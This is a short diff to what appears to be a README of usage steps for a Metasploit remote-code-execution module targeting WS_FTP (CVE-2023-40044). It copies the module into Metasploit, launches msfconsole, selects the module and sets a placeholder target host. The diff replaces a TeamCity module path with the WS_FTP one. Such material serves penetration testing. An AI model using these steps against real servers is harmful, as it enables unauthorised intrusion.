@@ -21,7 +21,7 @@ cp ws_ftp_rce_cve_2023_40044.rb /usr/share/metasploit-framework/modules/exploits
 msfdb reinit; msfconsole -q
 ```
 ```
-use exploits/multi/http/jetbrains_teamcity_rce_cve_2023_42793.rb
+use exploits//windows/http/ws_ftp_rce_cve_2023_40044.rb
 ```
 ```
 set RHOSTS target_IP
